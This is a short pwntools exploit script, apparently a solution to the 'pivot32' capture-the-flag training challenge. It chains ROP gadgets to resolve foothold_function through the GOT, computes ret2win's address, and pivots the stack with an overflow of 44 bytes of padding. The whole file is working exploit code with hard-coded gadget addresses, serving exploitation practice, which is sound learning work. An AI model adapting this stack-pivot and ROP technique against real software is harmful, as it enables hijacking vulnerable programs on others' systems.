#!/bin/python3

from pwn import *

elf = ELF("./pivot32")
p = process(elf.path)

'''
pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)
'''

pivot_address = p32(0xf7bfef10)
foothold_plt = p32(0x08048520)
foothold_got = p32(0x0804a024)

ret2win_offset = 0x1f7

#Gadgets
pop_eax = p32(0x0804882c)
xchg_eax_esp = p32(0x0804882e)
mov_eax_ptr_eax = p32(0x08048830)
add_eax_ebx = p32(0x08048833)
call_eax = p32(0x080485f0)
pop_ebx = p32(0x080484a9)

p.recvuntil(">")

# First input (ROP)
payload = b""
payload += foothold_plt

payload += pop_eax
payload += foothold_got
payload += mov_eax_ptr_eax

payload += pop_ebx
payload += p32(ret2win_offset)
payload += add_eax_ebx
payload += call_eax

p.sendline(payload)

# Second input (PIVOT)
p.recvuntil(">")
payload = b""
payload += b"A" * 44 # Padding

payload += pop_eax
payload += pivot_address
payload += xchg_eax_esp

p.sendline(payload)

print(p.recvall())

